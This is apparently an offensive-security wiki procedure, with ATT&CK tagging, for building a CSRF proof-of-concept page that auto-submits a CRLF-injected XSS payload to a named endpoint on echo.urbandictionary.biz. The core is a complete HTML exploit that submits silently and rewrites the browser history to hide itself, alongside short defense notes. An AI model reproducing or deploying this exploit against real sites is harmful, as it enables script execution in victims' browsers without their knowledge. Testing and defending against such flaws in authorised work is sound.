---
tags:
  - csrf
  - xss
  - poc
  - injection
type: procedure
tools:
  - '[[tools/Burp-Suite-Professional]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:57.661Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f6376936-17a6-4c70-a472-fe79ca3baf34
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-CSRF-PoC-for-XSS-Injection

## Summary

This procedure creates a CSRF proof-of-concept HTML page that auto-submits a POST request with a CRLF-injected XSS payload to a vulnerable .html endpoint on echo.urbandictionary.biz.

## Description

The procedure targets the lack of CSRF protections, using an HTML form to POST malicious content from a different origin. The payload exploits CRLF in form fields to inject script tags, which get reflected and executed. Requires hosting capability for the PoC and prior identification of the endpoint. Outcomes include successful payload delivery leading to JS execution.

## Requirements

1. Vulnerable endpoint confirmed (e.g., /xsxsxs.html)
2. Text editor for HTML crafting
3. Web server to host the PoC (local or remote)

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on all POST endpoints
- Validate Origin and Referer headers
- Sanitize reflected content and block CRLF in inputs

## Objectives

1. Auto-submit POST via CSRF without user interaction
2. Inject XSS payload using CRLF for header manipulation
3. Ensure payload executes as HTML/JS in victim context

## Instructions

### Step 1: Design the HTML Form

**Context**: Build a form targeting the vulnerable endpoint with text/plain enctype to mimic the test request.

Create the base structure with hidden input for payload.

### Step 2: Inject CRLF and Script Payload

**Context**: Embed CRLF (%0D%0A) in the input name to break out and inject Content-Type and script.

Full PoC:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://echo.urbandictionary.biz/xsxsxs.html" method="POST" enctype="text/plain">
<input type="hidden" name="test%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(document.domain)</script>" value="payload">
</form>
<script>
history.pushState('', '', '/');
document.getElementById('csrf').submit();
</script>
</body>
</html>
```

> This crafts a request body with injected headers and script, reflected as executable HTML.

### Step 3: Test PoC Locally

**Context**: Use Burp to verify the generated request before deployment.

Submit the form in a browser proxied through Burp and inspect the outgoing POST.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite-Professional]]

## Tags

- csrf
- xss
- poc
